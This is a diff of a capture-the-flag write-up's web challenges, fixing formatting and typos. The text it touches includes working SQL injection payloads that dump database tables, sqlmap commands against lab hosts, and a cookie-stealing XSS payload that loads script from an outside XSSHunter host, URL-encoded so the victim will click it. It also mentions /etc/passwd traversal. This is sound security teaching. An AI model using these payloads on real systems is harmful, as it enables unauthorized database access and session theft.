@@ -76,11 +76,13 @@ Looks like that doesn't get us very far. Maybe they're not using single quotes? 
 We got a response this time! It looks like the double quotes did it. So now we definitely know this is SQL injectable, and we need to try to extract the flag from it.
 
 Let's try to enumerate the tables within the database with this handy SQL line from [PentestMonkey](http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet):
+
 `" union select table_schema,table_name from information_schema.tables where table_schema != 'mysql' and table_schema != 'information_schema';#`
 
 ![Command failed](/resources/ists15/16.PNG)
 
 But alas, it appears this didn't work. If we look back at the normal output of the web app, we see the horoscope is the only thing being visibly returned from the database. Aha! Maybe the backend SQL code is only selecting a single column, where our injection is trying to select two? Let's try it again, but concatenate the `table_schema` and `table_name` this time:
+
 `" union select concat(concat(table_schema, '.'), table_name) from information_schema.tables where table_schema != 'mysql' and table_schema != 'information_schema';#`
 
 ![We got a response!](/resources/ists15/17.PNG)
@@ -90,16 +92,19 @@ Sweet, that got us a response at least! So we fixed the columns, but we're still
 Let's take another look at our injection. We're using `union` to combine the results from two `select` statements: one from the original backend SQL code, and one that we're injecting to pull the table names. These results are lumped into one large return set with multiple rows, and the database is simply returning the first row, which is the horoscope.
 
 To get around this, we can use SQL's `limit` and `offset` statements to select the exact row we want. Let's try grabbing the next row:
+
 `" union select concat(concat(table_schema, '.'), table_name) from information_schema.tables where table_schema != 'mysql' and table_schema != 'information_schema' limit 1 offset 1;#`
 
 ![Success!](/resources/ists15/18.PNG)
 
 Now we're cooking with gas! This looks like the table containing our flag. Let's take a look inside and list out the table's columns with the following injection:
+
 `" union select column_name from information_schema.columns where table_schema = 'horoscopes' and table_name = 'flags' limit 1 offset 1;#`
 
 ![A column named flag](/resources/ists15/19.PNG)
 
 A column named `flag`... this has gotta be it! Let's dump the `flag` column:
+
 `" union select flag from horoscopes.flags limit 1 offset 1;#`
 
 ![Australia?!](/resources/ists15/20.PNG)
@@ -118,7 +123,8 @@ A `description`! This might help us understand what's going on here. Let's see w
 
 A description of the Australian flag?!? You can't mean... AGH! We've been duped!! Foiled!
 
-So it looks like this was a fake database designed to throw us off. Thankfully, we can return to an earlier injection and keep looking for tables within the database:
+So it looks like this was a fake table designed to throw us off. Thankfully, we can return to an earlier injection and keep looking for tables within the database:
+
 `" union select concat(concat(table_schema, '.'), table_name) from information_schema.tables where table_schema != 'mysql' and table_schema != 'information_schema' limit 1 offset 2;#`
 
 ![Horoscopes](/resources/ists15/24.PNG)
@@ -140,7 +146,10 @@ Just what the doctor ordered. Let's get this over with, shall we?
 ![Our flag!](/resources/ists15/28.PNG)
 
 Note that it *is* possible to complete this challenge with SQLmap, but it's intentionally designed to be difficult to do so. The SQLmap command to pull the `private` database is:
-`sqlmap --data='month=January&day=1&year=1999' --level=5 -u http://192.168.132.133/index.php --threads=4 -D private --dump`. The process of deriving that command is left as an exercise for the reader.
+
+`sqlmap --data='month=January&day=1&year=1999' --level=5 -u http://192.168.132.133/index.php --threads=4 -D private --dump`
+
+The process of deriving that command is left as an exercise for the reader.
 
 ## 400
 
@@ -159,6 +168,7 @@ There's also a login link on top, and we can see that Girugamesh is currently lo
 ![Login form](/resources/ists15/32.PNG)
 
 Trying some basic SQL injection doesn't seem to get us anything. We can even fire SQLmap at the login endpoint, and it comes up empty.
+
 `sqlmap --data 'username=test&password=test' --level=5 -u http://192.168.132.145/login.php --threads=4`
 
 ![SQLmap error](/resources/ists15/33.PNG)
@@ -176,6 +186,7 @@ Looks like it is! But what value does XSS have to us? We're trying to attack the
 Let's revisit what we know so far. Girugamesh asked us for a link to the challenge website, and he's currently logged in... maybe we can leverage the XSS to steal his cookie and access the web app!
 
 To help us accomplish this, we can use [XSSHunter](https://xsshunter.com/) to generate a payload that will report a ton of information back to us whenever the XSS fires, including the victim's cookies. Our new XSSHunter payload is:
+
 `http://192.168.132.145/?<script src=https://dave.xss.ht></script>`
 
 Let's send that over to Girugamesh!
@@ -183,13 +194,14 @@ Let's send that over to Girugamesh!
 ![Looks like he doesn't like it](/resources/ists15/36.PNG)
 
 Hmm... looks like he knows something's fishy here. We'll need to find a way to make the link less suspicious so Girugamesh will click it. He said something about the ID having words... maybe we can URL-encode it to get rid of them? After URL-encoding, our new payload is:
-`http://192.168.132.145/?%3c%73%63%72%69%70%74%20%73%72%63%3d%68%74%74%70%73%3a%2f%2f%64%61%76%65%2e%78%73%73%2e%68%74%3e%3c%2f%73%63%72%69%70%74%3e`
 
-![He clicked it!](/resources/ists15/37.PNG)
+`http://192.168.132.145/?%3c%73%63%72%69%70%74%20%73%72%63%3d%68%74%74%70%73%3a%2f%2f%64%61%76%65%2e%78%73%73%2e%68%74%3e%3c%2f%73%63%72%69%70%74%3e`
 
 Girugamesh happily clicks our link now, and the XSS payload fires! We can use the generated XSSHunter report to view information gathered from the attack, including his session cookie.
 
-Our XSSHunter report reveals a cookie named `flag` with a value of `... ..-. ..- --.. ..- - ...- -- ... - -. --.. ..- ..-. .-. .--- ..- -.-- -.-- ..- -.- .--.`. Is that.. Morse code? Whatever, let's load it into our browser and see what the logged-in version of the page looks like.
+![He clicked it!](/resources/ists15/37.PNG)
+
+Our XSSHunter report reveals a cookie named `flag` with a value of `... ..-. ..- --.. ..- - ...- -- ... - -. --.. ..- ..-. .-. .--- ..- -.-- -.-- ..- -.- .--.`. Is that... Morse code? Whatever, let's load it into our browser and see what the logged-in version of the page looks like.
 
 ![Welcome!](/resources/ists15/38.PNG)
 
@@ -197,7 +209,8 @@ All we get is a welcome message and a cheeky YouTube video. Perhaps the flag is 
 
 Remember our login page? Maybe there's something there that can indicate how our cookie is generated. Taking a look at the login page source reveals an algorithm for generating the cookie client-side, which replaces our password and is sent to the server.
 
-`function hash_password(pwField) {
+```javascript
+function hash_password(pwField) {
 	hash = pwField.value.toLowerCase().split('');
 
 	caesarian_shift(hash, 13);
@@ -210,7 +223,8 @@ Remember our login page? Maybe there's something there that can indicate how our
 	hash = morse_code(hash);
 
 	pwField.value = hash.join(' ').replace(/ +/g, ' ');
-}`
+}
+````
 
 To get the original password (and the flag), it looks like we'll have to work backwards through this function to reverse this 'hashing' process:
 1. Translate the Morse code
@@ -262,7 +276,7 @@ Are you thinking what I'm thinking? Let's try to request something other than an
 
 ![Not happening](/resources/ists15/46.PNG)
 
-Hmm, it looks like there are some protections in place. The application must somehow detect that /etc/passwd isn't an image. If we look at the images on the page, all of their file paths begin with the `imdages` directory. Maybe if we start our directory traversal from `images`, we can evade the application's image checks?
+Hmm, it looks like there are some protections in place. The application must somehow detect that /etc/passwd isn't an image. If we look at the images on the page, all of their file paths begin with the `images` directory. Maybe if we start our directory traversal from `images`, we can evade the application's image checks?
 
 ![Invalid access token](/resources/ists15/47.PNG)
 
@@ -278,7 +292,7 @@ At this point we're pretty stumped. Let's try throwing the access code into Goog
 
 It looks like this is the [file signature](https://en.wikipedia.org/wiki/File_format#Magic_number) for JPEG images. Some more quick searching reveals `ffd8ffe1` is an alternative file signature for JPEGs with EXIF data. Could our access token simply be the file signature of the file we're requesting?
 
-To test this, let's download two images: `sub.JPG` with access token `ffd8ffe0`, and `mantle.jpg` with access token `ffd8ffe1`. Loading them into a hex editor, we see `sub.JPG` indeed begins with bytes `FF D8 FF E0`, and `mantle.jpg` begins with `FF D8 FF E1`.
+To test this, let's download two images from the page: `sub.JPG` with access token `ffd8ffe0`, and `mantle.jpg` with access token `ffd8ffe1`. Loading them into a hex editor, we see `sub.JPG` indeed begins with bytes `FF D8 FF E0`, and `mantle.jpg` begins with `FF D8 FF E1`.
 
 ![FF D8 FF E0](/resources/ists15/50.PNG)
 
